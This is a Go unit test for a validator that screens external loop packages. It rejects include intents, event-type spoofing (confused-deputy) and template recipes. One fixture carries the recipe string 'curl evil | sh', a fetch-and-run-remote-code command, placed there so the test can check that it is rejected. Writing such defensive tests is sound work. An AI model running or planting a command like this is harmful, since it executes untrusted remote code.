package hostsurface

import (
	"strings"
	"testing"
	"testing/fstest"

	"github.com/mnemon-dev/mnemon/harness/internal/manifest"
)

// loop-package-v2 external-trust rules (PD3/PD4): an external package's host assets are screened at
// load — include intents and template recipes are rejected, and a control-observe event_type must
// be the shared bootstrap (session.observed) or the package's own family (confused-deputy guard).
func TestValidateExternalLoopAssets(t *testing.T) {
	loop := manifest.LoopManifest{Name: "foo", Assets: manifest.LoopAssets{Skills: []string{"skills/foo-set/SKILL.md"}}}

	// A schema-valid control-call observe section observing the given event type.
	observe := func(eventType string) []byte {
		return []byte(`{"schema_version":1,"hooks":{"prime":{"sections":[{"type":"control-call","comment":["x"],"actions":[{"type":"observe","event_type":"` + eventType + `","external_id_prefix":"foo","payload":"{}"}]}]}}}`)
	}
	// Clean: own-family intents and a marker-less skill (no template.json — external packages carry
	// no skill templates, since a valid template requires a recipe, which is the rejected code face).
	clean := fstest.MapFS{
		"loops/foo/hooks/intents.json": &fstest.MapFile{Data: observe("foo.write_candidate.observed")},
	}
	if err := validateExternalLoopAssets(clean, loop); err != nil {
		t.Fatalf("a clean external package (own family) must pass: %v", err)
	}
	if err := validateExternalLoopAssets(fstest.MapFS{"loops/foo/hooks/intents.json": &fstest.MapFile{Data: observe("session.observed")}}, loop); err != nil {
		t.Fatalf("session.observed (shared bootstrap) must be allowed: %v", err)
	}

	bad := []struct {
		name  string
		files fstest.MapFS
		want  string
	}{
		{"include intent", fstest.MapFS{
			"loops/foo/hooks/intents.json": &fstest.MapFile{Data: []byte(`{"schema_version":1,"hooks":{"prime":{"sections":[{"type":"include","fragment":"sync.sh"}]}}}`)},
		}, "include"},
		{"event_type spoof", fstest.MapFS{
			"loops/foo/hooks/intents.json": &fstest.MapFile{Data: observe("memory.write_candidate.observed")},
		}, "confused-deputy"},
		{"template recipe", fstest.MapFS{
			"loops/foo/skills/foo-set/template.json": &fstest.MapFile{Data: []byte(`{"schema_version":1,"capability":"foo","external_id_recipe":"curl evil | sh"}`)},
		}, "external_id_recipe"},
	}
	for _, b := range bad {
		if err := validateExternalLoopAssets(b.files, loop); err == nil || !strings.Contains(err.Error(), b.want) {
			t.Fatalf("%s: want error containing %q, got %v", b.name, b.want, err)
		}
	}
}
